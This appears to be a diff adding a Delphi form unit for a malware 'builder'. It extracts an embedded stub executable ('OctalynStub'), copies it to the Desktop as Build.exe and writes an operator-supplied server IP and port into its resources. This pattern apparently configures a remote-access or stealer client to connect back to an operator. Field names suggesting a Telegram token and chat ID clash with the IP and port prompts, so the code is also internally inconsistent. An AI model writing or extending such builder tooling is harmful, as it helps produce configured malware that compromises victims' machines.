@@ -1,0 +1,98 @@
+unit Unit3;
+
+interface
+
+uses
+  Winapi.Windows, Winapi.Messages, System.SysUtils, System.Variants, System.Classes, Vcl.Graphics,
+  Vcl.Controls, Vcl.Forms, Vcl.Dialogs, dxGDIPlusClasses, Vcl.ExtCtrls,
+  Vcl.StdCtrls;
+
+type
+  TForm3 = class(TForm)
+    Image1: TImage;
+    GroupBox1: TGroupBox;
+    edtToken: TEdit;
+    mychatID: TEdit;
+    Label1: TLabel;
+    Label2: TLabel;
+    Button1: TButton;
+    GroupBox2: TGroupBox;
+    Label3: TLabel;
+    Label4: TLabel;
+    Label5: TLabel;
+    Label6: TLabel;
+    procedure Button1Click(Sender: TObject);
+  private
+    { Private declarations }
+  public
+    { Public declarations }
+  end;
+
+var
+  Form3: TForm3;
+
+implementation
+
+{$R *.dfm}
+
+
+  procedure ExtractEmbeddedExeToFile(const ResourceName, OutputPath: string);
+var
+  ResStream: TResourceStream;
+begin
+  // 'RCDATA' is the type you selected when embedding
+  ResStream := TResourceStream.Create(HInstance, ResourceName, RT_RCDATA);
+  try
+    ResStream.SaveToFile(OutputPath);
+  finally
+    ResStream.Free;
+  end;
+end;
+procedure TForm3.Button1Click(Sender: TObject);
+var
+  ServerPort: Integer;
+  TempStubPath, DesktopPath, DestPath: string;
+begin
+  TempStubPath := GetEnvironmentVariable('TEMP') + '\OctalynStub_temp.exe';
+  DesktopPath := GetEnvironmentVariable('USERPROFILE') + '\Desktop\';
+  DestPath := DesktopPath + 'Build.exe';
+
+  // Validate input parameters
+  if Trim(edtToken.Text) = '' then
+  begin
+    ShowMessage('Please enter a server IP address.');
+    Exit;
+  end;
+
+  if not TryStrToInt(mychatID.Text, ServerPort) then
+  begin
+    ShowMessage('Please enter a valid port number.');
+    Exit;
+  end;
+
+  try
+    // Extract embedded stub to a temp location
+    ExtractEmbeddedExeToFile('Resource_1', TempStubPath);
+
+    // Copy the extracted stub to the desktop as Build.exe
+    if not CopyFile(PChar(TempStubPath), PChar(DestPath), False) then
+      RaiseLastOSError;
+
+    // Modify Build.exe's resources
+    TResourceWriter.WriteServerInfoToResources(
+      DestPath,
+      edtToken.Text,
+      ServerPort
+    );
+
+    ShowMessage('Build.exe has been created on your desktop with your server settings.');
+  except
+    on E: Exception do
+      ShowMessage('Error: ' + E.Message);
+  end;
+
+  // Optional: Clean up temp file
+  DeleteFile(TempStubPath);
+end;
+
+end.
